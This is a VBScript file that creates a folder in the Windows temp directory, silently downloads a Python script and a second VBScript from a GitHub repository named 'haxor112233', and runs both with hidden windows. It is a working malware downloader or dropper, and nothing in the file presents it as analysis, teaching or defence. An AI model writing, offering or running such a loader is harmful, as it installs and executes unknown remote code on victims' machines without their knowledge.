Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%") & "\new"
scriptPathPy = tempFolder & "\a.py"
scriptPathVbs = tempFolder & "\b2.vbs"

' Check if the folder exists, if not, create it
If Not objFSO.FolderExists(tempFolder) Then
    objFSO.CreateFolder(tempFolder)
End If

' Download a.py using curl
objShell.Run "cmd /c curl -s -o """ & scriptPathPy & """ ""https://raw.githubusercontent.com/haxor112233/file/refs/heads/main/a.py""", 0, True

' Run a.py using pythonw
objShell.Run "pythonw """ & scriptPathPy & """", 0, False

' Download b2.vbs using curl
objShell.Run "cmd /c curl -s -o """ & scriptPathVbs & """ ""https://raw.githubusercontent.com/haxor112233/file/refs/heads/main/b2.vbs""", 0, True

' Run b2.vbs using wscript
objShell.Run "wscript """ & scriptPathVbs & """", 0, False
